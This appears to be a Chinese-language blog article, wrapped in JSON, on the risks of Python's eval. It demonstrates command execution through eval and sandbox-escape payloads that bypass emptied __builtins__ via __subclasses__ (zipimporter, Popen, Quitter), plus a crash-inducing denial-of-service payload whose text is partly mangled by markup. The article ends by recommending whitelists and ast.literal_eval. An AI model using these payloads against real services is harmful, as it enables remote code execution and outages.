{"title": "python 为什么说eval要慎用？使用eval 带来的潜在风险？什么情况下使用eval？ - 个人文章 ", "index": "python3.5,python2.7,python3.x,python", "content": "eval前言\nIn [1]: eval(\"2+3\")\nOut[1]: 5\n\nIn [2]: eval('[x for x in range(9)]')\nOut[2]: [0, 1, 2, 3, 4, 5, 6, 7, 8]\n\n当内存中的内置模块含有os的话，eval同样可以做到命令执行：\nIn [3]: import os\n\nIn [4]: eval(\"os.system('whoami')\")\nhy-201707271917\\administrator\nOut[4]: 0\n\n当然，eval只能执行Python的表达式类型的代码，不能直接用它进行import操作，但exec可以。如果非要使用eval进行import，则使用__import__：\nIn [8]: eval(\"__import__('os').system('whoami')\")\nhy-201707271917\\administrator\nOut[8]: 0\n\n在实际的代码中，往往有使用客户端数据带入eval中执行的需求。比如动态模块的引入，举个栗子，一个在线爬虫平台上爬虫可能有多个并且位于不同的模块中，服务器端但往往只需要调用用户在客户端选择的爬虫类型，并通过后端的exec或者eval进行动态调用，后端编码实现非常方便。但如果对用户的请求处理不恰当，就会造成严重的安全漏洞。\n安全”使用eval\n现在提倡最多的就是使用eval的后两个参数来设置函数的白名单：\nEval函数的声明为eval(expression[, globals[, locals]])\n其中，第二三个参数分别指定能够在eval中使用的函数等，如果不指定，默认为globals()和locals()函数中 包含的模块和函数。\n>>> import os\n>>> 'os' in globals()\nTrue\n>>> eval('os.system('whoami')')\nwin-20140812chjadministrator\n0\n>>> eval('os.system('whoami')',{},{})\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"\", line 1, in \nNameError: name 'os' is not defined\n\n如果指定只允许调用abs函数，可以使用下面的写法：\n>>> eval('abs(-20)',{'abs':abs},{'abs':abs})\n20\n>>> eval('os.system('whoami')',{'abs':abs},{'abs':abs})\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"\", line 1, in \nNameError: name 'os' is not defined\n>>> eval('os.system('whoami')')\nwin-20140812chjadministrator\n0\n\n使用这种方法来防护，确实可以起到一定的作用，但是，这种处理方法可能会被绕过，从而造成其他问题！\n绕过执行代码1\n被绕过的情景如下，小明知道了eval会带来一定的安全风险，所以使用如下的手段去防止eval执行任意代码：\nenv = {}\nenv[\"locals\"]   = None\nenv[\"globals\"]  = None\nenv[\"__name__\"] = None\nenv[\"__file__\"] = None\nenv[\"__builtins__\"] = None\n \neval(users_str, env)\n\nPython中的__builtins__是内置模块，用来设置内置函数的模块。比如熟悉的abs，open等内置函数，都是在该模块中以字典的方式存储的，下面两种写法是等价的：\n>>> __builtins__.abs(-20)\n20\n>>> abs(-20)\n20\n\n我们也可以自定义内置函数，并像使用Python中的内置函数一样使用它们：\n>>> def hello():\n...     print 'shabi'\n>>> __builtin__.__dict__['say_hello'] = hello\n>>> say_hello()\nshabi\n\n小明将eval函数的作用域中的内置模块设置为None，好像看起来很彻底了，但依然可以被绕过。__builtins__是__builtin__的一个引用，在__main__模块下，两者是等价的：\n>>> id(__builtins__)\n3549136\n>>> id(__builtin__)\n3549136\n\n根据乌云drops提到的方法，使用如下代码即可：\n[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == \"zipimporter\"][0](\"/home/liaoxinxi/eval_test/configobj-4.4.0-py2.5.egg\").load_module(\"configobj\").os.system(\"uname\")\n\n上面的代码首先利用__class__和__subclasses__动态加载了object对象，这是因为eval中无法直接使用object。然后使用object的子类的zipimporter对egg压缩文件中的configobj模块进行导入，并调用其内置模块中的os模块从而实现命令执行，当然，前提是要有configobj的egg文件。 configobj模块很有意思，居然内置了os模块：\n>>> \"os\" in configobj.__dict__\nTrue\n>>> import urllib\n>>> \"os\" in urllib.__dict__\nTrue\n>>> import urllib2\n>>> \"os\" in urllib2.__dict__\nTrue\n>>> configobj.os.system(\"whoami\")\nwin-20140812chjadministrator\n0\n\n和configobj类似的模块如urllib，urllib2，setuptools等都有os的内置，理论上使用哪个都行。 如果无法下载egg压缩文件，可以下载带有setup.py的文件夹，加入：\nfrom setuptools import setup, find_packages\n\n然后执行:\npython setup.py bdist_egg\n\n就可以在dist文件夹中找到对应的egg文件。 绕过demo如下：\n>>> env = {}\n>>> env[\"locals\"]   = None\n>>> env[\"globals\"]  = None\n>>> env[\"__name__\"] = None\n>>> env[\"__file__\"] = None\n>>> env[\"__builtins__\"] = None\n>>> users_str = \"[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'zipimporter'][0]('E:/internships/configobj-5.0.5-py2.7.egg').load_module('configobj').os.system('whoami')\"\n>>> eval(users_str, env)\nwin-20140812chjadministrator\n0\n>>> eval(users_str, {}, {})\nwin-20140812chjadministrator\n0\n\n拒绝服务攻击1\nobject的子类中有很多有趣的东西，执行以下代码查看：\n[x.__name__ for x in ().__class__.__bases__[0].__subclasses__()]\n\n这里我就不输出结果了，如果你执行的话，可以看到很多有趣的模块，比如file，zipimporter，Quitter等。经过测试，file的构造函数是被解释器沙箱隔离的。 简单的，或者直接使object暴露出的子类Quitter进行退出：\n>>> eval(\"[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__\n == 'Quitter'][0](0)()\", {'__builtins__':None})\n\nC:/>如果运气好，遇到对方程序中导入了os等敏感模块，那么Popen就可以用，并且绕过__builins__为空的限制，例子如下：\n>>> import subprocess\n>>> eval(\"[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'Popen'][0](['ping','-n','1','127.0.0.1'])\",{'__builtins__':None})\n \n>>>\n正在 Ping 127.0.0.1 具有 32 字节的数据:\n来自 127.0.0.1 的回复: 字节=32 时间>>\n\n事实上，这种情况非常多，比如导入os模块，一般用来处理路径问题。所以说，遇到这种情况，完全可以列举大量的功能函数，来探测目标object的子类中是否含有一些危险的函数可以直接使用。\n拒绝服务攻击2\n同样，我们甚至可以绕过__builtins__为None，造成一次拒绝服务攻击，Payload(来自老外blog)如下：\n>>> eval('(lambda fc=(lambda n: [c 1=\"c\" 2=\"in\" 3=\"().__class__.__bases__[0\" language=\"for\"][/c].__subclasses__() if c.__name__ == n][0]):fc(\"function\")(fc(\"code\")(0,0,0,0,\"KABOOM\",(),(),(),\"\",\"\",0,\"\"),{})())()', {\"__builtins__\":None})\n\n运行上面的代码，Python直接crash掉了，造成拒绝服务攻击。 原理是通过嵌套的lambda来构造一片代码段，即code对象。为这个code对象分配空的栈，并给出相应的代码字符串，这里是KABOOM，在空栈上执行代码，会出现crash。构造完成后，调用fc函数即可触发，其思路不可谓不淫荡。\n总结\n从上面的内容我们可以看出，单单将内置模块置为空，是不够的，最好的机制是构造白名单，如果觉得比较麻烦，可以使用ast.literal_eval代替不安全的eval。参考资料：\n【1】http://nedbatchelder.com/blog...\n【2】http://drops.wooyun.org/web/7490\n【3】http://stackoverflow.com/ques...\n【4】http://www.chenxm.cc/post/329...\n\n                ", "mainLikeNum": ["1 "], "mainBookmarkNum": "1"}